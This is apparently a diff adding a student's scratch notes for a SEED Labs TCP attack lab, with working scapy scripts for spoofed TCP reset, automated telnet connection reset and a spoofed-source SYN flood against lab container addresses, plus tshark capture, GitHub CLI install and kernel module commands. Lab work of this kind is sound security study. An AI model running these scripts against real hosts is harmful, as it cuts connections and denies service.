@@ -1,0 +1,71 @@
+sudo tshark -i br-818275ff5b0a -f "tcp and port 23" -o tcp.relative_sequence_numbers:FALSE -w /tmp.pcap -T fields -e frame.number -e tcp.seq -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.ack -e frame.time_epoch
+
+tee /home/seed/Lab2/volumes/reset.py <<-'EOF'
+#!/usr/bin/env python3
+from scapy.all import *
+import sys
+print(sys.argv)
+ip = IP(src="10.9.0.6", dst="10.9.0.5")
+tcp = TCP(sport=int(sys.argv[1]), dport=23, flags="R", seq=int(sys.argv[2]))
+pkt = ip/tcp
+ls(pkt)
+send(pkt, verbose=0)
+EOF
+
+
+netstat -tna | grep SYN_RECV | wc -l
+ss -n state syn-recv sport = :23 | wc -l
+docker exec -it seed-attacker python3 /volumes/reset.py 46112 4217598685
+
+tee /home/seed/Lab2/volumes/resetauto.py <<-'EOF'
+#!/usr/bin/env python3
+#!/usr/bin/python3
+from scapy.all import *
+def spoof_tcp(pkt):
+   IPLayer  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
+                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
+   spoofpkt = IPLayer/TCPLayer
+   ls(spoofpkt)
+   send(spoofpkt, verbose=0)
+pkt=sniff(iface='br-3cba7ed65b16', filter='tcp and port 23', prn=spoof_tcp) #br-3cba7ed65b16
+EOF
+
+tee /home/seed/Lab2/volumes/synflood.py <<-'EOF'
+#!/usr/bin/env python3
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+ip = IP(dst="10.9.0.5")      # victim
+tcp = TCP(dport=23, flags='S')      # 23 for telnet
+pkt = ip/tcp
+while True:
+      pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
+      pkt[TCP].sport = getrandbits(16) # source port
+      pkt[TCP].seq = getrandbits(32) # sequence number
+      send(pkt, iface = 'br-3cba7ed65b16' , verbose = 0)   # br-3cba7ed65b16
+EOF
+
+dmesg -Hkw
+unzip -d -r nf
+
+
+
+type -p curl >/dev/null || (sudo apt update && sudo apt install curl -y)
+curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg \
+&& sudo chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg \
+&& echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null \
+&& sudo apt update \
+&& sudo apt install gh -y
+
+https://drive.google.com/file/d/1A1IGuzwAtqnw95Y69VUC6CqK_GpIs-01/view
+https://drive.google.com/file/d/1e4MIqcsDaMyreMu9-F6RnDc63cNbNs4A/view?pli=1
+https://blog.csdn.net/qq_39852676/article/details/131352226
+
+
+sudo insmod hello.ko
+modinfo hello
+lsmod | grep hello
+
+sudo rmmod hello
+
